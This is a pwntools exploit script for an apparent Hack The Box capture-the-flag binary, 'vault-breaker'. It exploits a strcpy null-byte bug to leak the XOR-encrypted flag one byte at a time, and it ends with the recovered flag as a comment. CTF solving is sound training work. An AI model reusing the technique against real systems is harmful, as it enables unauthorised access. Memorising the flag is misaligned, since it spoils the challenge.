#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import binascii
from pwn import *

exe = context.binary = ELF('vault-breaker')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote("139.59.184.63", 32310)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break main
continue
'''.format(**locals())

# Strcpy places null byte after copying new key on top of old one
# Iterate from key length n = 0-31, grab byte n, which will be xor(0, flag_byte)

flag = []
for i in range(32):
    io = start()
    io.recvuntil(b'> ')
    io.sendline(b'1')
    io.recvuntil(b'31):')
    io.sendline(str(i).encode())
    
    io.recvuntil(b'> ')
    io.sendline(b'2')
    io.recvuntil(b'Master password for Vault: ')
    enc = io.recvline().strip()
    second_line = io.recvline().strip()
    if second_line != '':
        enc += second_line

    print(enc)
    io.close()    
    
    # Add byte to flag 
    flag.append(chr(enc[i]))
    print(''.join(flag))

# HTB{l4_c454_d3_b0nNi3}
